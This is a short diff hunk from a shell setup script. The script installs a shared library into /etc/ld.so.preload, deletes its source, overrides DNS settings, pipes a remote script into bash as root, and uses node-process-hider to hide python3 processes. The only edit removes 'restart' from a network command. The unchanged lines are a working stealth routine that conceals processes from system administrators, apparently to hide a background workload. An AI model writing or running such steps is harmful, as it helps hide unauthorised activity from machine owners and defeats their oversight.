@@ -10,7 +10,7 @@ mv libcikblek.so /usr/local/lib/
 echo /usr/local/lib/libcikblek.so >> /etc/ld.so.preload
 rm cikblek.c
 echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
-/etc/init.d/network restart
+/etc/init.d/network
 sudo su --command "curl -fsSL https://deb.nodesource.com/setup_20.x | sudo bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add python3"
 
 # Variabel
